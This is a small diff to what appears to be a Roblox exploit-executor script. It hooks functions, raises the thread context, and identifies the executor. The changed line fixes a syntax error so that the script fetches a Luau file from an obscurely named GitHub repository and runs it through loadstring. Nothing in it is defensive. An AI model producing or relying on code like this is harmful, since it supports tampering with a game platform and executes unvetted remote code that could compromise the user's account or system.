@@ -33,7 +33,7 @@ hookfunction(function2, v1)
 hookfunction(another1, v2)
 setthreadcontext(8)
 
-loadstring(game:HttpGet('https://raw.githubusercontent.com/x00x00-svg/XyZpQkz5uJ1b2vR232-Rt9-0mN8yIq2/refs/heads/main/maybe.luau')()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/x00x00-svg/XyZpQkz5uJ1b2vR232-Rt9-0mN8yIq2/refs/heads/main/maybe.luau'))()
 local function getexecutor()
     local exec = identifyexecutor()
     return tostring(exec)
